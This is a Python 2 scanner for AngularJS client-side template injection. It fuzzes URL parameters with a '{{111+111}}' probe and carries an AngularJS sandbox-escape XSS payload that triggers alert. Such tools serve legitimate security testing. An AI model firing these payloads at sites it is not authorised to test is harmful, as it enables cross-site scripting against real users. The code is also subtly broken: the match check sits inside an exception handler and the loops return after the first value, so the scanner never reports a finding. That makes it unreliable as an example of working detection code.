# -*- coding:utf-8 -*-
# !/usr/bin/env python
# referece:http://www.wooyun.org/bugs/wooyun-2010-0190247
# referece:http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html


import logging
import argparse
import requests
import traceback
import re
import json
import Queue
import threading


logging.basicConfig(level=logging.DEBUG,
                    format="%(asctime)s %(filename)s[%(lineno)d] "
                           "%(levelname)s %(message)s",
                    datefmt="%a, %d %b %Y %H:%M:%S",
                    )


class AnularJsTempleInject():
    def __init__(self):
        self.match = "aaa222bbb"
        self.pocpayload = "aaa{{111+111}}bbb"
        self.exppayload = "aaa{{%27a%27.constructor.prototype." \
                          "charAt=[].join;$eval(%27x=1}%20}%20" \
                          "};alert(%22longxiaowu%22)//%27);}}bbb"
        self.q = Queue.Queue()
        self.result = []

    def Fuzz(self):
        while not self.q.empty():
            url = ""
            try:
                url = self.q.get(block=False)
            except:
                break
            url = re.sub(r"\*", self.pocpayload ,url)
            try:
                msg = "Requests url : %s" % url
                logging.debug(msg)
                r = requests.get(url, timeout=10)
                content = r.content
            except:
                content = ""
                if self.match in content:
                    self.result.append(url)

    def sign(self, url):
        try:
            if "*" in url:
                return [url]
            urls = []
            if "?" in url:
                for i in re.finditer(r'\=(?P<value>.*?)(?:$|&)', url):
                    urls.append(url.replace(i.group("value"), "*"))
                    return urls
            else:
                for i in re.finditer(r'(?:\/|\-)(?P<value>\w*)(?:.html|.htm|$)', url):
                    urls.append(url.replace(i.group("value"), "*"))
                    return urls
        except:
            traceback.print_exc()
            return []

    def Scan(self,info):
        try:
            logging.debug("sign * replace value from url")
            if isinstance(info, str):
                for url in self.sign(info):
                    self.q.put(url)
            else:
                for i in info:
                    for url in self.sign(i['url']):
                        self.q.put(url)
            threads = []
            for i in xrange(10):
                t = threading.Thread(target=self.Fuzz, )
                t.start()
                threads.append(t)
            for i in threads:
                i.join()
        except:
            traceback.print_exc()

if __name__ == "__main__":
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", dest="url")
    parse.add_argument("-f", "--file", dest="file", help='test.json')
    arg = parse.parse_args()
    url = arg.url
    file = arg.file
    with open(file) as f:
		urls = json.loads(f.read())
    st = AnularJsTempleInject()
    info = url if url else urls
    st.Scan(info)
    if st.result:
        logging.debug("exist vul")
        for i in st.result:
            logging.debug(i)
    else:
        logging.debug("no vul")
